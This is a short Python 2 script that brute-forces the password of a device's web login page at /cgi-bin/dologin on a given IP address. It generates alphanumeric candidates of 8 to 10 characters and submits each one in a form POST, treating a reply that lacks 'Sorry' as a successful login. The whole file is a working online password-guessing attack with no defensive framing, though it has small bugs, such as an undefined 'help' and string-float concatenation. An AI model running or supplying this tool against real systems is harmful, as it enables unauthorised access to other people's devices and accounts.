import sys, getopt, itertools, requests
from timeit import default_timer as timer

start = timer()
charset = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"

def main(argv):
    help_message = "main.py -t <target IP>"
    threads = 1
    try:
        opts, args = getopt.getopt(argv,"h:t:n:",["target=", "num="])
    except getopt.GetoptError:
        print help
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print help_message
            sys.exit()
        elif opt in ("-t", "--target"):
            target = arg

    make_header(target)
	
	
def make_header(target):
    global charset
    count = 0
    url = 'http://' + target + '/cgi-bin/dologin'
	
    r = requests.get(url)
	
    for attempt in bruteforce(charset, 10):
        payload = {'P2': attempt, 'Login': 'Login', 'gnkey': '0b82'}
        count += 1
        if (count % 100) == 0:
            print "Trying " + attempt + "after " + timer()-start + "seconds"
            count = count % 100
            
        r = requests.get(url)

        # POST with form-encoded data
        r = requests.post(url, data=payload)
	
        if r.status_code != 200:
            print "Something is bad. Maybe the host is down?"
            return
        elif "Sorry" not in r.text:
            print "Got 'em! The password is "  + attempt + "in " + timer()-start + "seconds"
            return


def bruteforce(charset, maxlength):
    return (''.join(candidate)
        for candidate in itertools.chain.from_iterable(itertools.product(charset, repeat=i)
        for i in range(8, maxlength + 1)))
	
if __name__ == "__main__":
    main(sys.argv[1:])
